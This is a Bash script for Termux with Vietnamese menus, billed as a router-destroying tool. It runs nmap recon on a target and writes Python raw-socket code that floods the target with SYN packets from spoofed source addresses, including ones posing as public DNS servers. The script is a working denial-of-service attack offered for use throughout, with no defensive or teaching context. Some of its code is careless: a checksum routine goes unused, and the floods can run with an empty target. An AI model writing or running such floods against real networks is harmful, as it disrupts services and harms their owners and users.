#!/data/data/com.termux/files/usr/bin/bash

# =====================================================
# █▀▀ ▄▀█ ▀█▀ ▄▀█ ▀█▀ █ █▄░█ █▀▀    █▀▄ ▄▀█ ▀█▀ ▄▀█
# █▄█ █▀█ ░█░ █▀█ ░█░ █ █░▀█ █▄█    █▄▀ █▀█ ░█░ █▀█
# █▀█ █░█ █▄█ █░█ █▄█ █ █ █ █▀▀    ▄▀█ █░█ █▄█ █░█
# ▀▀█ █▄█ ░█░ █▄█ ░█░ █ ▀ ▀ ██▄    █▀█ █▄█ ░█░ █▄█
# =====================================================
# TRUE LAYER 2 DESTROYER - Router's Worst Nightmare
# =====================================================

# ASCII Art Variables
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Global Variables
TARGET_IP=""
TARGET_MAC=""
GATEWAY_IP=""
INTERFACE=""
ROUTER_TYPE=""
LOG_FILE="/data/data/com.termux/files/home/khang_log.txt"

show_banner() {
    clear
    echo -e "${RED}"
    echo '╔════════════════════════════════════════════════════════════════╗'
    echo '║  ██╗  ██╗██╗  ██╗ █████╗ ███╗   ██╗ ██████╗     ██╗  ██╗██████╗ ║'
    echo '║  ██║  ██║██║  ██║██╔══██╗████╗  ██║██╔════╝     ██║  ██║╚════██╗║'
    echo '║  ███████║███████║███████║██╔██╗ ██║██║  ███╗    ███████║ █████╔╝║'
    echo '║  ██╔══██║██╔══██║██╔══██║██║╚██╗██║██║   ██║    ██╔══██║██╔═══╝ ║'
    echo '║  ██║  ██║██║  ██║██║  ██║██║ ╚████║╚██████╔╝    ██║  ██║███████╗║'
    echo '║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝╚══════╝║'
    echo '╠════════════════════════════════════════════════════════════════╣'
    echo '║    ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗       ║'
    echo '║    ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║       ║'
    echo '║    ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║██║       ║'
    echo '║    ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║██║       ║'
    echo '║    ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝███████╗  ║'
    echo '║    ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝  ║'
    echo '╚════════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
}

initialize_system() {
    echo -e "${CYAN}[*] Khởi tạo Khang Hủy Diệt Layer 2...${NC}"
    pkg update -y && pkg install python nmap arp-scan tcpdump hping3 -y
    pip install scapy colorama
    touch $LOG_FILE
    echo -e "${GREEN}[✓] Hệ thống đã sẵn sàng!${NC}"
    sleep 1
}

packet_crafter() {
    echo -e "${PURPLE}[=== TÙY BIẾN PACKET TỪ LỚP THẤP NHẤT ===]${NC}"
    cat << 'EOF' > /data/data/com.termux/files/home/custom_packet.py
import socket, struct, random, time
from threading import Thread

class RawPacketCrafter:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        s = (s >> 16) + (s & 0xffff); s = ~s & 0xffff
        return s

    def send_packet(self, source_ip):
        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(source_ip), socket.inet_aton(self.target_ip))
        tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), self.target_port, random.randint(0,4294967295), 0, (5 << 4), 0x02, 5840, 0, 0)
        self.sock.sendto(ip_header + tcp_header, (self.target_ip, 0))

    def flood(self, count=100):
        ips = ["8.8.8.8", "1.1.1.1", "142.250.185.174"]
        for i in range(count):
            Thread(target=self.send_packet, args=(random.choice(ips),)).start()
            if i % 10 == 0: print(f"Sent {i} crafted packets", end='\r')
EOF
    echo -e "${GREEN}[✓] Packet Crafter Ready!${NC}"
}

router_recon() {
    echo -e "${CYAN}[=== QUÉT VÀ NHẬN DIỆN ROUTER ===]${NC}"
    read -p "Nhập target IP: " TARGET_IP
    nmap -O --osscan-guess $TARGET_IP 2>/dev/null
    TARGET_MAC=$(arp -a $TARGET_IP | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
    INTERFACE=$(ip route | grep default | awk '{print $5}')
    echo -e "${GREEN}[✓] Recon hoàn thành: $TARGET_IP [$TARGET_MAC]${NC}"
}

smart_spoofing() {
    echo -e "${PURPLE}[=== GIẢ MẠO THÔNG MINH ===]${NC}"
    cat << 'EOF' > /data/data/com.termux/files/home/smart_spoof.py
import socket, struct, random, threading
def flood(target, count):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    for _ in range(count):
        src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        pkt = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 12345, 0, 64, 6, 0, socket.inet_aton(src), socket.inet_aton(target))
        pkt += struct.pack('!HHLLBBHHH', 1234, 80, 0, 0, 5<<4, 2, 5840, 0, 0)
        s.sendto(pkt, (target, 0))
EOF
    echo -e "${GREEN}[✓] Smart Spoofer Ready!${NC}"
}

main_menu() {
    while true; do
        show_banner
        echo -e "1. Recon Router"
        echo -e "2. Smart Spoof Flood"
        echo -e "3. Raw Packet Crafting"
        echo -e "4. Exit"
        read -p "Lựa chọn: " choice
        case $choice in
            1) router_recon ;;
            2) python3 -c "import sys; sys.path.append('/data/data/com.termux/files/home'); from smart_spoof import flood; flood('$TARGET_IP', 1000)" ;;
            3) python3 -c "import sys; sys.path.append('/data/data/com.termux/files/home'); from custom_packet import RawPacketCrafter; c = RawPacketCrafter('$TARGET_IP'); c.flood(500)" ;;
            4) exit 0 ;;
        esac
    done
}

initialize_system
packet_crafter
smart_spoofing
main_menu
